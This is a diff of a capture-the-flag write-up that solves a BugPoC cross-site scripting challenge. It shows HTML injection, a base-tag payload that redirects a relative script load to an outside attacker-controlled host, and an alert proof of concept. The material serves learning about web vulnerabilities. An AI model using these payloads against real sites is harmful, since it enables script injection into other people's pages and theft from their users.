@@ -92,14 +92,14 @@ const otherTab = window.open("https://wacky.buggywebsite.com/frame.html", window
 
 Clicking the button we just defined will successfully open the iframe a page we now partially control (the `windowName` variable). Upon checking the console, we see that a strange script `frame-analytics.js` that prints our User-Agent, OS and language has also been loaded automatically. 
 
-![Frame Analytics](../assets/BugPoC/frame-analytics.js.png)
+![Frame Analytics](../assets/bugpoc/frame-analytics.js.png)
 
 This must be a hint.
 
 ## Step 3: HTML Injection
 Let's try adding `?param=Test` into our link and see what happens. 
 
-![Param=test](../assets/BugPoC/param=test.png)
+![Param=test](../assets/bugpoc/param=test.png)
 
 We've got an injection! 
 
@@ -173,13 +173,13 @@ script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
 
 Hey, it's not an absolute URL! This means that we can actually load it on our host instead, using the [Document Base URL Element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base). Let's quickly use BugPoC's handy [Mock Endpoint Builder](https://bugpoc.com/testers/other/mock) to host our payload without using our own domain. 
 
-![Mock Endpoint](../assets/BugPoC/mock-endpoint-2020-11-0.png)
+![Mock Endpoint](../assets/bugpoc/mock-endpoint-2020-11-0.png)
 
 CORS Header `"Access-Control-Allow-Origin": "*",` must be added as it is not by default, unlike Github Pages. 
 
 Using the [Flexible Redirector](https://bugpoc.com/testers/other/redir), also by BugPoC, we can get a redirect link that would redirect with any path permutations. This means that if there happens to be some regex on the backend checking for file extensions, we can easily bypass it!
 
-![Flexible Redirector](../assets/BugPoC/flexible-redirector-2020-11-0.png)
+![Flexible Redirector](../assets/bugpoc/flexible-redirector-2020-11-0.png)
 
 ```javascript
 var baseBypass = "<base href='https://luvedyp86epw.redir.bugpoc.ninja'>"
@@ -255,7 +255,7 @@ window.parent.alert(origin)
 
 Let's quickly [host our PoC on BugPoC](https://bugpoc.com/testers/front-end) for submission:
 
-![Front-End PoC](../assets/BugPoC/front-end-poc-2020-11.png)
+![Front-End PoC](../assets/bugpoc/front-end-poc-2020-11.png)
 
 Click "Publish" to receive a password-protected link. You can check out mine below:
 
@@ -266,7 +266,7 @@ Password: ePicmule05
 
 ## Flag
 
-![Flag](../assets/BugPoC/flag-2020-11.png)
+![Flag](../assets/bugpoc/flag-2020-11.png)
 
 That was a fun challenge. 
 
